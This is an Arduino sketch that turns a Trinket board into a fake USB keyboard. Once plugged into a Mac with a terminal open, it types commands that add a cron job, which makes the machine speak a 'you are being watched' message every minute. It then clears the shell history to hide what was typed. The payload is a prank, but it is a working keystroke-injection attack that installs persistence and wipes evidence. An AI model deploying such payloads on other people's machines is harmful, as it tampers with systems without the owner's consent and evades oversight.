#include <TrinketKeyboard.h>


void setup() {
  TrinketKeyboard.begin();
  TrinketKeyboard.poll();
  // Gives you some time to disable the new keyboard popup
  delay(3000);
}

void loop()
{
  TrinketKeyboard.poll();  
  // Add a new cron job
  // English version
  // TrinketKeyboard.println("   (crontab -l 2>/dev/null; echo \"* * * * * say -v Whisper Apple is watching you\")| crontab -");
  // French version
  TrinketKeyboard.println("   (crontab -l 2>/dev/null; echo \"* * * * * say -v Thomas Vous aites observer. Apple aipie vos faits et gestes\")| crontab -");

  // Clean after yourself
  TrinketKeyboard.println("  history -c");
  TrinketKeyboard.println("  reset");

  // Exit Terminal
  // TODO : find keycode for Command + Q

  // Gives you some time to unplug the device before it types again
  delay(30000);

}
